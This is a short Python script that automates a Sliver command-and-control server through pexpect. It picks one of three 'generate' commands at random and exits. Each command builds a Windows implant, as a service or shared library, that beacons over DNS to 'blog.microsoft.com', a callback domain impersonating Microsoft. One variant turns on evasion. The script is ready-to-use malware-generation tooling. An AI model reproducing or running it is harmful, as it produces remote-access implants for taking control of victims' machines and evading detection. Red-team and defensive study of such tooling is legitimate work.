import random 
import pexpect
import time


def main():

			list_commands = ['generate --dns blog.microsoft.com --os windows --arch 386 -f service -s dns__386.service' , 'generate --dns blog.microsoft.com --os windows --arch amd64 -f shared -s dns__amd64.shared' , 'generate --dns blog.microsoft.com -e --os windows --arch amd64 -f service -s dns__evasion_amd64.service' ]
			start_time = time.time()
			#print(len(list_commands))
			sliver = pexpect.spawn('./sliver-server')
			sliver.sendline(random.choice(list_commands))
			sliver.sendline('exit')
			sliver.interact()
			print("--- %s seconds ---" % (time.time() - start_time))


if __name__ == '__main__':
	main()
